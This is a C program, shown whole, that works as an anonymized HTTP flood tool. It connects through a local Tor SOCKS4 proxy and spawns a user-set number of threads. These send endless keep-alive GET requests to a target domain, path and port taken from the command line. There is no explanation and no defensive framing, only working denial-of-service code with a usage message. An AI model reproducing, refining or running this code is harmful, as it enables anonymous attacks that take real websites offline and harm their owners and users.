#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>
#include <fcntl.h>

struct hostent *host;
struct sockaddr_in sa;
struct timeval tv;
int port;
char *ip, *url, *req;

struct socks4 {
 char ver;
 char cmd;
 short port;
 unsigned int ip;
 char login;
}packeds;

void *sendtor(void *unused) {
 char resp[1024];
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  send(fd, &packeds, 9, MSG_NOSIGNAL);
  while(send(fd, req, strlen(req), MSG_NOSIGNAL) != -1 && recv(fd, resp, 1024, MSG_NOSIGNAL) != -1) {
   dprintf(1, "%s%s\n", req, resp);
   memset(resp, 0, 1024);
  }
  close(fd);
 } else {
  close(fd);
 }
}

int makereq() {
 packeds.ver = 4;
 packeds.cmd = 1; 
 packeds.port = htons(port); 
 packeds.ip = *((unsigned int *)host->h_addr);
 req = malloc(1024); 
 sprintf(req, "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n", url, ip);
}

int makeproxies() {
 sa.sin_addr.s_addr = inet_addr("127.0.0.1"); 
 sa.sin_port = htons(9050); 
 sa.sin_family = AF_INET;
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 if(argc < 5) {
  dprintf(1, "domain/ip url port threads\n");
  return 0; 
 }
 port = atoi(argv[3]);
 ip = argv[1];
 url = argv[2];
 if((host = gethostbyname(ip))) {
  makeproxies();
  makereq();
  pthread_t threads[atoi(argv[4])];
  while(1) {
   for(int i = 0; i < atoi(argv[4]); i++) {
    pthread_create(&threads[i], 0, &sendtor, 0);
   }
   for(int i = 0; i < atoi(argv[4]); i++) {
    pthread_join(threads[i], 0);
   }
  }
 } else {
  dprintf(1, "Could not resolve address\n");
 }
}